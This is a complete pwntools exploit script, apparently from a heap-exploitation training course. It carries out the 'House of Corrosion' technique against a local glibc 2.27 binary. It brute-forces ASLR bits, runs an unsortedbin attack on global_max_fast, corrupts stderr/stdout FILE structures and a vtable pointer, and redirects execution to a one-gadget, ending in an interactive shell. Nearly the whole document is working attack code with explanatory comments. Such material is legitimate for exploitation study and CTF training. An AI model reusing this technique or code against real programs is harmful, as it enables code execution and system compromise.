#!/usr/bin/python3
from pwn import *

# Set logging level to "error" to lessen verbosity.
context.log_level = logging.ERROR

elf = context.binary = ELF("house_of_corrosion", checksec=False)
libc = ELF(elf.runpath + b"/.debug/libc-2.27.so", checksec=False)

gs = '''
set substitute-path /build/glibc-OTsEL5/glibc-2.27 ../.glibc/glibc_2.27_ubuntu1804
set breakpoint pending on
break _IO_str_overflow
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Keep track of the total number of bruteforce attempts.
attempts = 1

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.sendthen(b"size: ", b"1")
    io.sendthen(b"> ", f"{size}".encode())
    index += 1
    return index - 1

# Use malloc() helper to request a chunk of specific size.
# e.g. malloc_chunksize(0x420) requests a 0x420-sized chunk.
def malloc_chunksize(size):
    return malloc((size & ~0x0f) - 8)

# Select the "free" option; send index.
def free(index):
    io.sendthen(b"index: ", b"2")
    io.sendthen(b"> ", f"{index}".encode())

# Select the "edit" option; send index & data.
def edit(index, data):
    io.sendthen(b"index: ", b"3")
    io.sendthen(b"data: ", f"{index}".encode())
    io.sendthen(b"> ", data)

# Calculate chunk sizes used during global_max_fast corruption.
def gmf_chunksize(address):
    return (2 * (address - (libc.sym.main_arena + 0x10))) + 0x21 # 0x01 to ensure prev_inuse flag is set.

# Convenience function. Request a chunk with size calculated by gmf_chunksize().
def gmf_malloc(address):
    return malloc_chunksize(gmf_chunksize(address))

# Start logging.
context.log_level = logging.WARNING
logger = log.progress("House of Corrosion", level=logging.WARNING)
logger.status(f"attempt {attempts} - initializing")

# Loop the exploit until success.
# If debugging pass the ONCE argument to avoid loop.
while(True):
    try:
        logger.status(f"attempt {attempts} - starting a new process")
        io = start()

        # This binary does not leak any addresses.
        io.recvuntil(b"> ")

        # Guess the least-significant 4 bits of entropy from the libc load address.
        if args.GDB:
            # When debugging ensure we "guess" correctly.
            libc.address = [io.libs()[lib] for lib in io.libs() if "/libc-2.27.so" in lib][0]  & 0xf000
            info(f"guessed entropy: 0x{libc.address:02x}")
        else:
            # 0x00007f??????3000 and 0x00007f??????4000 are bad libc load addresses for this GLIBC build.
            libc.address = 0x7000

        io.timeout = 0.1

        # =============================================================================

        # Transplant sources & destinations.
        src = libc.sym.__morecore # The __morecore hook holds the address of __default_morecore().
        dst1 = libc.sym._IO_2_1_stderr_ + 0x40 # stderr _IO_buf_end field
        dst2 = libc.sym._IO_2_1_stderr_ + 0xe0 # stderr _allocate_buffer() ptr (stdout._flags)


        # -=-=-= REQUEST FIXED-SIZE CHUNKS =-=-=-
        logger.status(f"attempt {attempts} - requesting fixed-size chunks")

        unsortedbin_atk = malloc_chunksize(0x430) # unsortedbin attack chunk
        fake_chunk_size = gmf_malloc(libc.sym.dumped_main_arena_start) # target: fake chunk size field
        fake_chunk_bk = gmf_malloc(libc.sym.pedantic) # target: fake chunk bk pointer
        stderr_flags = gmf_malloc(libc.sym._IO_2_1_stderr_) # target: stderr _flags field
        stderr_bufbase = gmf_malloc(libc.sym._IO_2_1_stderr_ + 0x38) # target: stderr _IO_buf_base field
        stderr_writeptr = gmf_malloc(libc.sym._IO_2_1_stderr_ + 0x28) # target: stderr _IO_write_ptr field
        stderr_vtable = gmf_malloc(libc.sym._IO_2_1_stderr_ + 0xd8) # target stderr vtable ptr
        stdout_mode = gmf_malloc(libc.sym._IO_2_1_stdout_ + 0xc0) # target: stdout _mode field


        # -=-=-= HEAP FENG-SHUI =-=-=-
        logger.status(f"attempt {attempts} - heap feng-shui")

        # Large chunk size field tamper & transplant src nextsize values
        # Displace following chunks so that size fields line up with UAF later.
        tmp = malloc_chunksize(0x420)

        # Used for tampering with large chunk's size field.
        # Also writes transplant chunk's src nextsize field to heap.
        tamper_large = malloc_chunksize(gmf_chunksize(src) + 0x420 + 16)
        free(tamper_large)
        free(tmp)

        # Transplant dst nextsize values & size field tamper.
        # Displace following chunks so that size fields line up with UAF later.
        tmp = malloc_chunksize(0x840)

        # Writes transplant chunk's dst1 nextsize field to heap.
        tmp2 = malloc_chunksize(gmf_chunksize(dst1) + 16)
        free(tmp2)

        # Used for tampering with transplant chunk's size field.
        # Also writes transplant chunk's dst2 nextsize field to heap.
        tamper_transplant = malloc_chunksize(gmf_chunksize(dst2) + 16)
        free(tamper_transplant)
        free(tmp)

        # lost1 chunk nextsize value & size field tamper.
        # Displace following chunks so that size fields line up with UAF later.
        tmp = malloc_chunksize(0x860)

        # Used for tampering with lost1 chunk's size field.
        # Also writes lost1 chunk's nextsize field to heap.
        tamper_lost = malloc_chunksize(gmf_chunksize(dst1) + 16)
        free(tamper_lost)
        free(tmp)


        # -=-=-= REQUEST TRANSPLANT, LARGE, & "LOST" CHUNKS =-=-=-
        logger.status(f"attempt {attempts} - requesting transplant, large & lost chunks")

        # Displace following chunks so that size fields line up with UAF later.
        malloc_chunksize(0x430)

        # Large chunk, sort this into the largebins and set its NON_MAIN_ARENA flag.
        large = malloc_chunksize(0x420)

        # Transplant chunk, transplant values move through this.
        transplant = malloc_chunksize(0x20)

        # lost1 chunk, used for securing a double-free in dst1 slot.
        # Starts small so that lost2 can be nearby transplant chunk.
        lost1 = malloc_chunksize(0x20)

        # Free large chunk into unsortedbin.
        free(large)

        # lost2 chunk, used for securing a double-free in dst2 slot.
        # This request also sorts large chunk into largebins.
        lost2 = gmf_malloc(dst2)


        # -=-=-= UNSORTEDBIN ATTACK =-=-=-
        logger.status(f"attempt {attempts} - triggering unsortedbin attack")

        # Blind unsortedbin attack against global_max_fast, requires guessing 4 bits of ASLR entropy.
        # If we guess correctly here, the rest of the exploit should work perfectly.
        free(unsortedbin_atk)
        edit(unsortedbin_atk, p64(0) + p16((libc.sym.global_max_fast & 0xffff) - 0x10))
        malloc_chunksize(0x430)


        # -=-=-= PREPARE LARGE & FAKE CHUNKS =-=-=-
        logger.status(f"attempt {attempts} - preparing large & fake chunks")

        # Set the NON_MAIN_ARENA flag in large_chunk size field.
        # This will trigger a failed assert when sorting the fake chunk into the 0x400 largebin.
        # Edit the tamper_large chunk, which overlaps large_chunk's size field.
        edit(tamper_large, p64(0) + p16(0x425))

        # Set the fake chunk size field so it will be sorted into the 0x400 largebin.
        # Use the fake_chunk_size chunk for this.
        free(fake_chunk_size)
        edit(fake_chunk_size, p64(0x401))
        gmf_malloc(libc.sym.dumped_main_arena_start)

        # Set fake chunk bk to a writable address using the fake_chunk_bk chunk.
        free(fake_chunk_bk)


        # -=-=-= ADJUST STDERR VTABLE PTR =-=-=-
        logger.status(f"attempt {attempts} - adjusting stderr vtable pointer")

        # Use primitive 2 to modify the 2 least-significant bytes of stderr's vtable pointer.
        # Overlap the __xsputn entry with the __overflow entry of _IO_str_jumps.
        free(stderr_vtable)
        edit(stderr_vtable, p16((libc.sym._IO_str_jumps - 0x20) & 0xffff)) # 0x20 for __overflow, 0x28 for __finish
        gmf_malloc(libc.sym._IO_2_1_stderr_ + 0xd8)


        # -=-=-= CLEAR STDERR FLAGS =-=-=-
        logger.status(f"attempt {attempts} - clearing stderr._flags")

        # Zero stderr._flags to ensure our function pointer gets called.
        # _IO_str_overflow() will return early if certain flags are set.
        # This field also ends up in the rcx register at the point we hijack the flow of execution, which
        # satisfies one of the one-gadget constraints (rcx == NULL).
        free(stderr_flags)
        edit(stderr_flags, p64(0))
        gmf_malloc(libc.sym._IO_2_1_stderr_)


        # -=-=-= POPULATE STDERR _IO_write_ptr =-=-=-
        logger.status(f"attempt {attempts} - populating stderr._IO_write_ptr")

        # Write a large value to stderr._IO_write_ptr to ensure (_IO_write_ptr - _IO_write_base) >= (_IO_buf_end - _IO_buf_base).
        # Use the "stderr_writeptr" chunk for this.
        free(stderr_writeptr)
        edit(stderr_writeptr, p64(0x7fffffffffffffff))
        gmf_malloc(libc.sym._IO_2_1_stderr_ + 0x28)


        # -=-=-= POPULATE STDERR _IO_buf_base =-=-=-
        logger.status(f"attempt {attempts} - populating stderr._IO_buf_base")

        # Populate stderr._IO_buf_base with the difference between __default_morecore() & a one-gadget.
        free(stderr_bufbase)
        edit(stderr_bufbase, p64(libc.sym.__default_morecore - (libc.address + 0x4f2c5))) # rcx == NULL
        gmf_malloc(libc.sym._IO_2_1_stderr_ + 0x38)


        # -=-=-= CRAFT DOUBLE-FREE IN DST1 =-=-=-
        logger.status(f"attempt {attempts} - securing double-free in dst1")

        # Double-free in dst1 (stderr._IO_buf_end field).
        # Set transplant chunk's size to dst1.
        edit(tamper_transplant, p64(0) + p16(gmf_chunksize(dst1)))

        # Set lost1 chunk's size to dst1.
        edit(tamper_lost, p64(0) + p16(gmf_chunksize(dst1)))

        # Free lost1 then free transplant, modify least-significant byte of transplant fd to point to itself.
        free(lost1)
        free(transplant)
        edit(transplant, p8(0x00)) # This byte is heap layout dependent.

        # Request transplant chunk.
        # Afterwards transplant chunk is allocated but also freed into _IO_buf_end "fastbin slot".
        transplant = gmf_malloc(dst1)


        # -=-=-= DEACTIVATE STDOUT =-=-=-
        logger.status(f"attempt {attempts} - deactivating stdout, things may slow down")

        # Set stdout._mode to 1 to ensure its _flags field is not clobbered.
        free(stdout_mode)
        edit(stdout_mode, p64(1))
        gmf_malloc(libc.sym._IO_2_1_stdout_ + 0xc0)


        # -=-=-= CRAFT DOUBLE-FREE IN DST2 =-=-=-
        logger.status(f"attempt {attempts} - securing double-free in dst2")

        # Double-free in dst2 (stdout._flags field).
        # Set transplant chunk's size to dst2.
        edit(tamper_transplant, p64(0) + p16(gmf_chunksize(dst2)))

        # Free lost2 then free transplant, modify least-significant byte of transplant fd to point to itself.
        free(lost2)
        free(transplant)
        edit(transplant, p8(0x00)) # This byte is heap layout dependent.

        # Request transplant chunk.
        # Afterwards transplant chunk is allocated but also free into stdout._flags "fastbin slot".
        transplant = gmf_malloc(dst2)


        # -=-=-= EXECUTE DST1 TRANSPLANT =-=-=-
        logger.status(f"attempt {attempts} - transplanting __default_morecore() into stderr._IO_buf_end")

        # Transplant address of __default_morecore() into stderr._IO_buf_end.
        # Write src value to heap.
        edit(tamper_transplant, p64(0) + p16(gmf_chunksize(src)))
        free(transplant)

        # Copy src value (address of __default_morecore()) into dst1 (stderr._IO_buf_end)
        # for subtraction with stderr._IO_buf_base field.
        edit(tamper_transplant, p64(0) + p16(gmf_chunksize(dst1)))
        transplant = gmf_malloc(dst1)


        # -=-=-= EXECUTE DST2 TRANSPLANT =-=-=-
        logger.status(f"attempt {attempts} - transplanting 'call rax' gadget into stdout._flags")

        # Transplant address of 'call rax' gadget into stdout._flags.
        # Since we're doing the transplants back to back we can just reuse the address of __default_morecore().
        # In the training example we had to use a 2nd transplant source (obstack_alloc_failed_handler, which
        # contains the address of print_and_abort()) because __default_morecore() was clobbered when we
        # secured the 2nd double-free.

        # Modify src value (__default_morecore()) to point at 'call rax' gadget.
        # __default_morecore() is near enough to print_and_abort() that we can use the same one-gadget.
        edit(transplant, p16((libc.address + 0x9cd3f) & 0xffff))

        # Copy modified src value (address of 'call rax' gadget) into dst2 (stdout._flags)
        edit(tamper_transplant, p64(0) + p16(gmf_chunksize(dst2)))
        transplant = gmf_malloc(dst2)


        # -=-=-= TRIGGER FAILED ASSERT =-=-=-
        logger.status(f"attempt {attempts} - triggering assert() in largebin code")

        # Request a chunk to sort the fake chunk into the 0x400 largebin.
        # The chunk placed there earlier fails the assert that this chunk does not have the NON_MAIN_ARENA flag set.
        malloc(24)

    # Likely error if the exploit failed, try again if ONCE arg is not present.
    except EOFError:
        if args.ONCE:
            break
        try:
            io.close()
        except BrokenPipeError:
            pass
        index = 0
        attempts += 1
        continue

    logger.success(f"attempt {attempts} - shell")
    break

# =============================================================================

io.interactive()
